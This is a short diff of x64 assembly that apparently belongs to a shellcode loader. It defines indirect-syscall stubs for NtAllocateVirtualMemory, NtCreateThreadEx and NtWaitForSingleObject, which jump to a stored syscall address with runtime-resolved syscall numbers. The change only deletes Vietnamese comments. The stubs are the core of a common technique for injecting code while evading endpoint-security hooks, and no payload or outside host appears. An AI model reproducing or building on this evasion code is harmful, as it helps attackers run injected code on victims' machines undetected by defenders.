@@ -17,22 +17,18 @@ section .text
 
 sysNtAllocateVirtualMemory:
     mov r10, rcx
-    ; --- THAY ĐỔI QUAN TRỌNG ---
-    ; Sử dụng Rip-Relative Addressing
     mov eax, dword [rel g_ssn_NtAllocateVirtualMemory]
     jmp qword [rel g_syscall_addr]
     ret
 
 sysNtCreateThreadEx:
     mov r10, rcx
-    ; --- THAY ĐỔI QUAN TRỌNG ---
     mov eax, dword [rel g_ssn_NtCreateThreadEx]
     jmp qword [rel g_syscall_addr]
     ret
 
 sysNtWaitForSingleObject:
     mov r10, rcx
-    ; --- THAY ĐỔI QUAN TRỌNG ---
     mov eax, dword [rel g_ssn_NtWaitForSingleObject]
     jmp qword [rel g_syscall_addr]
     ret
